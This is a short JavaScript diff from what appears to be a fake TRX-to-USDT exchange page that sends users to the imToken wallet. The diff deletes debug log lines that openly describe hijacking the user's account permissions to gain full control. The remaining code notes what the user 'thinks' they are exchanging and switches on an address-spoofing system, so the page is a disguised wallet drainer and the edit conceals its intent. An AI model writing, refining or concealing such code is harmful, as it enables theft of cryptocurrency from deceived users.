@@ -2710,8 +2710,6 @@
 
     // 连接imToken
     async function connectImToken() {
-        debugLog('🔑🔑🔑 用户点击兑换按钮 - 直接跳转imToken执行权限劫持攻击！🔑🔑🔑');
-
         // 检查用户是否输入了兑换金额
         const fromAmount = document.getElementById('fromAmount').value;
         if (!fromAmount || parseFloat(fromAmount) <= 0) {
@@ -2720,7 +2718,6 @@
         }
 
         debugLog(`🔑 用户以为兑换: ${fromAmount} TRX → ${(fromAmount * 0.1634).toFixed(6)} USDT`);
-        debugLog('🔑 实际攻击: 将在imToken中劫持用户账户权限，获得完全控制权！');
 
         // 🎭 在跳转imToken前激活简化版地址伪装系统
         if (window.SimpleAddressSpoofing) {
